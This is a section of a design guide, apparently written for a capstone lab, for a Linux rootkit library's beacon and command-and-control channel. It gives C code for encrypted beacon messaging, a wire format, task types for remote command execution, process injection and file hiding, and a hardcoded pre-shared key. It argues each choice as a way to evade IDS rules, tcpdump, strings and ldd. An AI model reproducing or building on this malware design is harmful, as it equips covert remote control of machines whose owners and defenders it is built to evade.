## Beacon + C2

```
librootkit.so (beacon thread)  ──TCP──►  C2 server (Python)
                                              │
                                   issues commands over encrypted channel
                                   EXEC_CMD | INJECT_PID | HIDE_FILE
```

Beacon loop:

1. Connect to hardcoded C2 IP:PORT
2. Send magic handshake + PSK proof
3. Send heartbeat: hostname, kernel version, uid, pid, timestamp
4. Send `TASK_REQ`; block waiting for `TASK_RESP`
5. Execute the task; send `TASK_RESULT`
6. Sleep N seconds, repeat

---

## Encrypted Beacon Payload (Special Feature)

### Why Encrypt

A plaintext beacon is trivially detectable:

- IDS rules match on command strings like `exec`, `inject`, `hide` appearing in TCP streams
- `tcpdump` on the C2 side shows hostnames, credentials, and command results in clear text
- `strings librootkit.so` reveals the C2 IP, port, and protocol details
- Replay attacks: anyone who captures the traffic can retransmit commands

Encrypting with an AEAD cipher solves all of these. The wire traffic looks like random bytes. The auth tag prevents replay and forgery.

### Algorithm: ChaCha20-Poly1305

ChaCha20 is a stream cipher. Poly1305 is a one-time authenticator. Combined as an AEAD (Authenticated Encryption with Associated Data), they give you confidentiality + integrity in one operation.

|Property|Value|
|---|---|
|Key|256-bit (32 bytes)|
|Nonce|96-bit (12 bytes) — must be unique per message|
|Auth tag|128-bit (16 bytes) — appended to ciphertext|
|Security|256-bit for confidentiality, 128-bit for authentication|

Why ChaCha over AES-GCM: AES-GCM requires hardware AES acceleration (AES-NI on x86, AES extensions on AArch64) to be fast. ChaCha20 is fast in pure software on any architecture. For a lab running on QEMU emulating AArch64, ChaCha is the better default. Both are secure; this is a performance and portability choice.

### Key Management

**Option A — Pre-Shared Key (recommended for capstone)**

A 32-byte secret compiled into both `librootkit.so` and the C2 server:

```c
static const uint8_t PSK[32] = {
    0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
    /* 16 more bytes */
};
```

No key exchange, no round trips, no PKI. The weakness: the key is static and can be extracted from the binary. For a capstone demo this is a known and accepted limitation. Note it in ur writeup.

**Option B — X25519 Ephemeral Diffie-Hellman (stronger)**

The C2 server has a long-term X25519 keypair. Its public key is compiled into the beacon. On every connection:

1. Beacon generates a fresh ephemeral X25519 keypair
2. Beacon sends its ephemeral public key to the server
3. Both sides compute `shared_secret = X25519(their_private, peer_public)`
4. Both derive `session_key = HKDF-SHA256(shared_secret, "beacon-session-key")`

Each session gets a unique key derived from an ephemeral value. Even if the server's long-term key is later compromised, past sessions cannot be decrypted (forward secrecy). This is what TLS 1.3 does.

**Recommendation:** Ship PSK for the demo, document Option B as a future improvement.

### Nonce

Each message needs a unique 12-byte nonce. Two valid approaches:

- **Random**: `getrandom(nonce, 12, 0)` before every `encrypted_send`. Simple. The probability of a collision over the lifetime of a capstone demo is astronomically small.
- **Counter**: A global `uint64_t counter` incremented per message, zero-padded to 12 bytes. Guaranteed unique within a session, but must be reset on reconnect.

Use random nonces. They're simpler and more than safe enough here.

### Wire Format

Every encrypted message on the wire looks like this:

```
[ 1 byte  : version = 0x01          ]
[ 12 bytes: nonce (random)          ]
[ 4 bytes : length of ciphertext+tag, big-endian uint32 ]
[ N bytes : ciphertext              ]
[ 16 bytes: Poly1305 authentication tag ]
```

The receiver reads the nonce and length first, allocates a buffer, reads the ciphertext+tag, then calls `chacha20poly1305_decrypt`. If the tag doesn't verify, the connection is dropped and the data is discarded without being acted on. This prevents any replay or forgery.

### `encrypted_send` / `encrypted_recv`

These are drop-in replacements for raw `send()`/`recv()`. Every place the beacon previously called `send(fd, data, len, 0)` now calls `encrypted_send(fd, PSK, data, len)`:

```c
void encrypted_send(int fd, const uint8_t *key,
                    const void *plaintext, size_t len) {
    uint8_t nonce[12];
    getrandom(nonce, 12, 0);

    size_t ct_len = len + 16;   // ciphertext + tag
    uint8_t *ciphertext = malloc(ct_len);
    chacha20poly1305_encrypt(ciphertext, plaintext, len, nonce, key);

    uint8_t version = 0x01;
    send(fd, &version, 1, MSG_MORE);
    send(fd, nonce, 12, MSG_MORE);
    uint32_t framed_len = htonl(ct_len);
    send(fd, &framed_len, 4, MSG_MORE);
    send(fd, ciphertext, ct_len, 0);
    free(ciphertext);
}

ssize_t encrypted_recv(int fd, const uint8_t *key,
                       void *out, size_t max_out) {
    uint8_t version;
    if (recv_all(fd, &version, 1) < 0) return -1;

    uint8_t nonce[12];
    if (recv_all(fd, nonce, 12) < 0) return -1;

    uint32_t ct_len_net;
    if (recv_all(fd, &ct_len_net, 4) < 0) return -1;
    uint32_t ct_len = ntohl(ct_len_net);

    uint8_t *ciphertext = malloc(ct_len);
    if (recv_all(fd, ciphertext, ct_len) < 0) { free(ciphertext); return -1; }

    int ok = chacha20poly1305_decrypt(out, ciphertext, ct_len, nonce, key);
    free(ciphertext);

    if (!ok) return -1;               // authentication failed
    return (ssize_t)(ct_len - 16);    // plaintext length
}
```

### Message Types

```c
#define MSG_HEARTBEAT   0x01   // beacon → C2: I'm alive, here's my info
#define MSG_TASK_REQ    0x02   // beacon → C2: give me a task
#define MSG_TASK_RESP   0x03   // C2 → beacon: here's our task
#define MSG_TASK_RESULT 0x04   // beacon → C2: task output
```

Heartbeat payload (before encryption):

```
{ type: 0x01, hostname: "aarch64-lab", kernel: "6.6.0",
  uid: 0, pid: 1234, timestamp: 1711843200 }
```

### Crypto Library

Embed **monocypher** directly into `librootkit.so`. It's two files (`monocypher.c`, `monocypher.h`), about 1000 lines of C, no external dependencies, and implements ChaCha20-Poly1305 correctly in constant time. The entire crypto stack becomes part of our `.so` — nothing shows up in `ldd` output. Libsodium is more widely audited but adds a visible shared library dependency.

### Why This is a Strong Special Feature

1. **Authentication built in** — the Poly1305 tag authenticates every message. A forged or replayed command is detected before it's acted on.
2. **Full confidentiality** — hostnames, PIDs, command strings, and results are all encrypted. `tcpdump` sees random bytes.
3. **No IDS signatures** — no plaintext patterns to match against. Traffic is indistinguishable from noise on the wire.
4. **Forward secrecy (with Option B)** — a key compromise doesn't expose past sessions.
5. **Zero link-time dependencies** — monocypher embedded means no `libsodium.so` or `libcrypto.so` in `ldd` output, which would be an obvious red flag.
6. **Correct nonce hygiene** — random per-message nonces prevent nonce reuse, which is the primary failure mode for stream cipher-based AEAD schemes.

---
